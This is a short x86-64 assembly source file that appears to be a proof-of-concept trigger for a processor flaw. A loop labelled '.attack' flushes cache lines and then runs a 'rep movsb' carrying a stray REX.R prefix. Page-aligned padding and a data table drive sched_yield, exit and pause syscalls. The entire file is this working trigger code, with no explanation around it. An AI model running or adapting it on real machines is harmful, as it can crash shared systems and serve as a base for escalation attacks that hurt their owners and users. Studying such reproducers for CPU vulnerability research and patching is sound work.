BITS 64

global _start

section .text
    _start:
        mov rbx, data
        lea rsi, [rsp+1]
        mov rdi, rsi
        jmp .suffix
        .attack:
        %rep 1
            align 0x1000
            ; 16 bytes
            times 4 nop ; 4 bytes
            dec rsi     ; 3 bytes
            dec rdi     ; 3 bytes
            inc rdx     ; 3 bytes
            inc rcx     ; 3 bytes
            ; 16 bytes
            clflush [rdi]    ; 3 bytes
            clflush [rsi+64] ; 4 bytes
            mov [rsp], rdx   ; 4 bytes
            rep              ; 1 byte
            db 0x44; rex.r   ; 1 byte
            movsb            ; 1 byte
            rep              ; 1 byte
            nop              ; 1 byte
        %endrep
        .suffix:
        align 0x1000
        times 0x1000*8 xlat ; mov al, ds:[ebx+al]
        mov dil, dl ; counter
        syscall
        mov rax, 1  ; exit
        xor ecx, ecx; clear ecx
        jmp .attack

section .data
    align 0x1000
    data:
        db 24 ; first iteration (yield)
        db 60 ; second iteration (exit)
        times 22 db 34
        db 24 ; data[24]=24
        times 9 db 34
        db 34 ; data[34]=34
        times 25 db 34
        db 60 ; data[60]=60
        times 0x1000-60 db 34 ; (pause)
